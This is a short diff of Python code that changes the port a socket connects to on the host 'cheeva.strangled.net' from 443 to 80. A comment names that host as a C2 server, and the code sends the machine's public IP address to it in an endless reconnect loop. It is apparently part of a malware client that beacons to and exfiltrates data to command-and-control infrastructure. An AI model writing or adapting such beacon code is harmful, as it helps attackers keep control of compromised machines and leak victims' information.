@@ -51,7 +51,7 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("cheeva.strangled.net", 443))
+            s.connect(("cheeva.strangled.net", 80))
             
             # Instantly pass the public IP string to the C2 server
             s.send(f"{true_ip}\n".encode())
